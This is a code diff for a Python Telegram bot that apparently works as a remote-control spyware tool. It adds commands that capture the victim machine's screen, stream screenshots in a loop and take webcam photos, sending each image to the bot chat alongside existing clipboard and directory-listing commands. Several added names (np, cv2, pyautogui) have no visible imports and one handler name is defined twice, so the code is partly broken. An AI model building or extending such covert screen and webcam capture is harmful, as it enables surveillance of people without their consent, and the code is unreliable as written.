@@ -2,8 +2,9 @@ import logging
 import platform
 import subprocess
 import sys
+import time
 import urllib.request as urllib
-
+from mss import mss
 import pyperclip
 from aiogram import Bot, Dispatcher, executor, types
 from config import admins, token
@@ -18,6 +19,84 @@ logging.basicConfig(level=logging.INFO)
 # Initialize bot and dispatcher
 bot = Bot(token=token)
 dp = Dispatcher(bot)
+
+
+class MSSSource:
+    def __init__(self):
+        self.sct = mss()
+
+    def frame(self, top, left, width, heigth):
+        monitor = {'top': top, 'left': left, 'width': width, 'height': heigth}
+        im = np.array(self.sct.grab(monitor))
+        im = np.flip(im[:, :, :3], 2)  # 1
+        im = cv2.cvtColor(im, cv2.COLOR_BGR2RGB)  # 2
+        return True, im
+
+    def release(self):
+        pass
+
+
+
+@dp.message_handler(commands=["scr"])
+async def screen(message: types.Message):
+    source = MSSSource()
+    if message["from"]["id"] in admins:
+        width, height = pyautogui.size()
+        ret, frame = source.frame(0, 0,  width, height)
+        cv2.imwrite("tmp.png", frame)
+        # await message.answer(message.photo())
+        with open('tmp.png', 'rb') as photo:
+            await message.answer_document(photo)
+        os.remove("tmp.png")
+
+@dp.message_handler(commands=["scrsmall"])
+async def screensmall(message: types.Message):
+    source = MSSSource()
+    if message["from"]["id"] in admins:
+        width, height = pyautogui.size()
+        ret, frame = source.frame(0, 0,  width, height)
+        cv2.imwrite("tmp.png", frame)
+        # await message.answer(message.photo())
+        with open('tmp.png', 'rb') as photo:
+            await message.answer_photo(photo)
+        os.remove("tmp.png")
+
+@dp.message_handler(commands=["scrstart"])
+async def vid(message: types.Message):
+    if message["from"]["id"] in admins:
+        try:
+            args = message.get_args()
+        except:
+            args = 0
+        args = int(args)
+        with open('video.cfg', 'w') as f:
+            f.write("True")
+        source = MSSSource()
+        while True:
+            with open('video.cfg', 'r') as f:
+                state = f.read()
+                if state == "True":
+                    width, height = pyautogui.size()
+                    ret, frame = source.frame(0, 0,  width, height)
+                    cv2.imwrite("tmp.png", frame)
+                    # await message.answer(message.photo())
+                    with open('tmp.png', 'rb') as photo:
+                        await message.answer_photo(photo)
+                    os.remove("tmp.png")
+                    try:
+                        time.sleep(args/1000)
+                    except:
+                        pass
+
+                else:
+                    os.remove("video.cfg")
+                    break
+
+
+@dp.message_handler(commands=["scrstop"])
+async def stop(message: types.Message):
+    with open('video.cfg', 'w') as f:
+        f.write("False")
 
 
 @dp.message_handler(commands=["screen"])
@@ -176,6 +255,31 @@ async def clipfile(message: types.Message):
         except:
             await message.answer(cb)
 
+
+@dp.message_handler(commands=["cap"])
+async def getcap(message: types.Message):
+    if message["from"]["id"] in admins:
+        cap = cv2.VideoCapture(0)
+        ret, frame = cap.read()
+        cv2.imwrite("cap.png", frame)
+        # await message.answer(message.photo())
+        with open('cap.png', 'rb') as photo:
+            await message.answer_document(photo)
+        os.remove("cap.png")
+
+
+@dp.message_handler(commands=["capsmall"])
+async def getcap(message: types.Message):
+    if message["from"]["id"] in admins:
+        cap = cv2.VideoCapture(0)
+        ret, frame = cap.read()
+        cv2.imwrite("cap.png", frame)
+        # await message.answer(message.photo())
+        with open('cap.png', 'rb') as photo:
+            await message.answer_photo(photo)
+        os.remove("cap.png")
+
+
 @dp.message_handler(commands=["ls"])
 async def ls(message: types.Message):
     if message["from"]["id"] in admins:
@@ -194,6 +298,7 @@ async def ls(message: types.Message):
             # await message.answer(string)
         except:
             await message.answer("Errcode " + str(result.returncode))
+
 
 if __name__ == '__main__':
     executor.start_polling(dp, skip_updates=True)
